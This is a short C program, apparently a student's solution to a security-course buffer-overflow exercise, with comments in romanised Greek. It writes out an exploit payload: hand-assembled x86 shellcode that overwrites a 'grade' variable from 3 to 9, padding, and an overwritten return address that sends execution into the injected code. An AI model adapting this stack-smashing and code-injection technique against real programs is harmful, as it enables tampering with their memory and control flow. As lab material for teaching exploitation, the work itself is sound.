#include <stdio.h>
#define FILL 16
#include <stdlib.h>


int main() {
    int changes = 0;  /* gia debug tin exw den exei shmasia */
    int i = 0;
   
    /* ta addresses einai 4 bytes
     * ena pshfio sto hex einai 1byte
     * ara 4 bytes einai 4 psifia sto hex
     */
    fputs("Gkeka          's",stdout);
    putchar('\0'); 
	
    /* o skopos einai na allaksei o vathmos apo 3 se 6 dhladh:
     * &grade = $1 = 0x80b006c
	 * xreiazetai auth h entolh
     * movb $0x39,0x8 0b 0 06c
     * 0x8048b68 <main+74>:	movb   $0x36,0x8 0d 46 e8
     */
    
    /* opote exoume movb me opcode 0xc6 */
    putchar(0xc6);
    putchar(0x05);
     
	
    /* prepei na grapsoume to grade */
    putchar(0xe8);
    putchar(0x46);
    putchar(0x0d);
    putchar(0x08);
    
    /* Allazei o vatmhos 3 se 9 */
    putchar(0x39);
	
    /* prepei na epistrepsoume sthn main */
    /* sozoume ton eax */
    putchar(0xb8); 
	
    putchar(0x6f);
    putchar(0x8b);
    putchar(0x04);
    putchar(0x08);
	
    /* jump opcode */
    putchar(0xff); 
    putchar(0xe0); 
	
	
    /* paromoia me thn askisi gia ton vathmo 6, afou egrapsa 12 byte stin arxi
     * grafw ta ypoloia edw*/
    for (; i < FILL; i++) {putchar('\0');}
    /* mexri na ftasoume ta 56 theloume alla 8 */
    putchar ('8'); 
    
    /* h metavliti changes xrisimopoiithike gia debug metrontas poses allages ekana
     * den ephreazei to apotelesma
     */
    
    /* return address mesa ston pinaka, idio shmeio me thn askisi gia ton vathmo 6
     * h entolh se assembly einai 0x8048b68 <main+74>:	movb   $0x36,0x80d46e8
     */    
    putchar(0xf0);
    changes++;
    putchar(0x65);
    changes++;
    putchar(0x0d);
    changes++;
    putchar(0x08);
    
    /* opws kai sthn prohgoumenh prepei na exoume to &Name  = $3 = (char (*)[44]) */
    putchar(0xe0);
    changes++;
    putchar(0x65);
    changes++;
    putchar(0x0d);
    changes++;
    putchar(0x08);
    changes++;
    
    return changes;
}
